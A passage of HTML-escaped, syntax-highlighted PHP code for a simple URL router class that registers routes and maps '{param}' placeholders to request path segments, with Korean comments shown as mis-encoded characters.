        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request_uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ë¼ìš°íŒ… ë§¤ì¹­ ì¶”ê°€ í•¨ìˆ˜ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeExpression&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* ì†Œë©¸ìë¡œ ì†Œë©¸ë˜ì§€ ì•Šê³  ë©”ëª¨ë¦¬ì— ì¡´ì¬í•  ì‹œ ë¹„ì •ìƒ ì˜¤ë¥˜ ì´ë¯€ë¡œ ê°•ì œ ì¢…ë£Œ */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;routeExists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;LogicException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ë©”ëª¨ë¦¬ì— ì¤‘ë³µ ì¡´ì¬ë¡œ ì—ëŸ¬ ë°œìƒ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_default_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            
            &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
            &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;routeName&quot;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;routeExpression&quot;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$routeExpression&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;routeClass&quot;&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$routeClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;routeFunction&quot;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$routeFunction&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;notPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ì˜ëª»ëœ í˜ì´ì§€ ì…ë‹ˆë‹¤.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* destruct ì†Œë©¸ìë¥¼ í†µí•˜ì—¬ ì œëŒ€ë¡œ ì†Œë©¸ì´ ì•ˆë˜ì–´ ë©”ëª¨ë¦¬ì— ë°ì´í„°ê°€ ë‚¨ì•„ ìˆëŠ”ì§€ ì²´í¬ í•¨ìˆ˜ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;routeExists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* í•´ë‹¹ ë°°ì—´ í‚¤(ë°°ì—´ ëª…)ì´ ì¡´ì¬ì‹œ 1, ì‹¤íŒ¨ì‹œ 0 */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$routeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ìš”ì²­ URI íŒŒë¼ë¯¸í„° ë¶„ë¦¬ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRequestParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/*
            $this-&amp;gt;_request_uri = $_SERVER[&quot;REQUEST_URI&quot;];
            $this-&amp;gt;_request     = $request; / 
            [1] =&amp;gt; test
             [2] =&amp;gt; d
        */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRequestMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addSlashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripSlashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strip_tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ëª¨ë“  ë°°ì—´ ì¶œë ¥ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;showCurrentRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/*
        [test] =&amp;gt; Array                     (ë°°ì—´ ëª…) 
            (
            [routeName]         =&amp;gt;  test             (ë°°ì—´ ì´ë¦„) ì¤‘ë³µ ê¸ˆì§€
            [method]            =&amp;gt;  GET              (ë©”ì†Œë“œ)
            [routeExpression]   =&amp;gt;  test/{id}        (ë§í¬ êµ¬ë¶„ì)
            [routeClass]        =&amp;gt;  test             (í´ë˜ìŠ¤ ëª…)
            [routeFunction]     =&amp;gt;  test_fun         (í•¨ìˆ˜ ëª…)
            )
        */&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_default_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;notPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRouteParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/*
            [0] =&amp;gt; test
            [1] =&amp;gt; {id}
        */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;showCurrentRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;routeExpression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRouteParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/*
            [2] =&amp;gt; 123
        */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRouteParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/*
            [0] =&amp;gt; id
        */&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;preg_match_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/\{(.*?)\}/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;showCurrentRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;routeExpression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$routeParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;combinedParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* no íŒŒë¼ë¯¸í„° ì¸ìê°€ ì¡´ì¬ì‹œ  */&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$no_reg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$no_reg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$getRouteParams_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRouteParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$getExpressionParams&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getRouteParams_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getRouteParams_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;array_push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getRouteParams_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_combine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$getRouteParams_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;        
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRouteParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;notPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_combine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExpressionParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRouteParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

